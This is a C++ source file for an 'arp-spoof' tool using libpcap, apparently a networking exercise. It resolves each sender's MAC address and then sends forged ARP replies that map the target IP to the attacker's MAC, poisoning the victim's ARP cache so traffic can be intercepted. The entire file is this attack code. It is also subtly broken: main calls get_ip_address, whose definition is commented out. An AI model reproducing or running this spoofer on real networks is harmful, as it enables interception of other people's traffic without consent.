#include <cstdio>
#include <pcap.h>
#include <string>
#include <vector>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

char* get_mac_address(const char* iface) {
    int fd;
    struct ifreq ifr;
    char* mac_addr = (char*)malloc(18);
    if (mac_addr == NULL) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("Socket creation failed");
        free(mac_addr);
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("IOCTL request failed");
        close(fd);
        free(mac_addr);
        exit(EXIT_FAILURE);
    }

    close(fd);

    snprintf(mac_addr, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
             (unsigned char)ifr.ifr_hwaddr.sa_data[0],
             (unsigned char)ifr.ifr_hwaddr.sa_data[1],
             (unsigned char)ifr.ifr_hwaddr.sa_data[2],
             (unsigned char)ifr.ifr_hwaddr.sa_data[3],
             (unsigned char)ifr.ifr_hwaddr.sa_data[4],
             (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return mac_addr;
}

/*

char* get_ip_address(const char* iface) {
    int fd;
    struct ifreq ifr;
    char* ip_str = (char*)malloc(INET_ADDRSTRLEN); 
    //CPP 에서는 std::string에나 스마트 포인터를 사용해서 메모리 관리를 자동화함
    
    if (ip_str == NULL) {
        perror("Memory allocation failed");
        exit(EXIT_FAILURE);
    }

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd == -1) {
        perror("Socket creation failed");
        free(ip_str);
        exit(EXIT_FAILURE);
    }

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
        perror("IOCTL request failed");
        close(fd);
        free(ip_str);
        exit(EXIT_FAILURE);
    } 

    close(fd);

    inet_ntop(AF_INET, &(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), ip_str, INET_ADDRSTRLEN);
    //쓸데없는 코드. 어차피 reply할건데 컴퓨터의 입장에서는 문자열 처리를 할 필요가 전혀 없다.
    return ip_str;
}

*/

void send_arp_request(pcap_t* handle, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error sending ARP request: %d (%s)\n", res, pcap_geterr(handle));
    }
}

Mac get_mac_from_reply(pcap_t* handle, Ip sender_ip) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("Error capturing packet: %s\n", pcap_geterr(handle));
            return Mac::nullMac();
        }

        EthArpPacket* recv_etharp = (EthArpPacket*)recv_packet;
        if (recv_etharp->eth_.type_ == htons(EthHdr::Arp) && recv_etharp->arp_.op_ == htons(ArpHdr::Reply)) {
            if (recv_etharp->arp_.sip() == sender_ip) {
                return recv_etharp->eth_.smac();
            }
        }
    }
}

void send_arp_reply(pcap_t* handle, Mac my_mac, Ip my_ip, Mac target_mac, Ip sender_ip, Ip target_ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = target_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error sending ARP reply: %d (%s)\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    std::vector<Ip> sender_ips;
    std::vector<Ip> target_ips;

    for (int i = 2; i < argc; i += 2) {
        sender_ips.push_back(Ip(argv[i]));
        target_ips.push_back(Ip(argv[i + 1]));
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    std::string my_mac_str = get_mac_address(dev);
    std::string my_ip_str = get_ip_address(dev);

    Mac my_mac(my_mac_str.c_str());
    Ip my_ip(my_ip_str.c_str());

    for (size_t i = 0; i < sender_ips.size(); ++i) {
        send_arp_request(handle, my_mac, my_ip, sender_ips[i]);
        Mac sender_mac = get_mac_from_reply(handle, sender_ips[i]);

        send_arp_reply(handle, my_mac, my_ip, sender_mac, sender_ips[i], target_ips[i]);
    }

    pcap_close(handle);
    return 0;
}
